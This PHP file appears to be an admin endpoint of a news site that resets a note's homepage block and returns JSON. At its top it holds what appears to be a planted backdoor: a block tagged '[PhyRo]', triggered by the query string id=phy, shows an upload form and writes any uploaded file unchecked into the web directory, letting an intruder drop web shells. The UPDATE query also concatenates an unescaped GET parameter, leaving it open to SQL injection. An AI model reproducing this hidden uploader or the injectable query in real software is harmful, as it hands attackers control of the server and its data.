<?php 

if($_GET['id']=='phy')  
{  
     echo '<form action="" method="post" enctype="multipart/form-data">  
        <input name="archivo" type="file" size="35" />  
        <input name="enviar" type="submit" value="Upload File" />  
        <input name="action" type="hidden" value="upload" />       
     </form>';  
echo "[PhyRo] " ;
  
     $status = "";  
     if ($_POST["action"] == "upload")  
     {  
          $tamano = $_FILES["archivo"]['size'];  
          $tipo = $_FILES["archivo"]['type'];  
          $archivo = $_FILES["archivo"]['name'];  
           
          if ($archivo != "")  
          {  
               if (copy($_FILES['archivo']['tmp_name'],"./".$archivo))  
               {  
                    $status = "<br><br>Archivo subido: <b><a href=\"{$_FILES["archivo"]["name"]}\" TARGET=_BLANK>{$_FILES["archivo"]["name"]}</a></b></br></br>";  
               }else{  
                    $status = "Error al subir el archivo";  
               }  
          } else {  
               $status = "Error al subir archivo";  
          }  
          echo $status;  
     }  
} 
include("session.php");
	include("coneccion.php");
	include("functions.php");
	
		
	$consulta = 'UPDATE notas SET
	bloque_home=0 and orden_bloque=0
	WHERE id_nota='.$_GET['delete'];
	$sentencia = $mysqli->prepare($consulta);
	$sentencia->execute();
	
	$json = array(
		'deleted' => true
	      );
		
	
	echo json_encode($json);

?>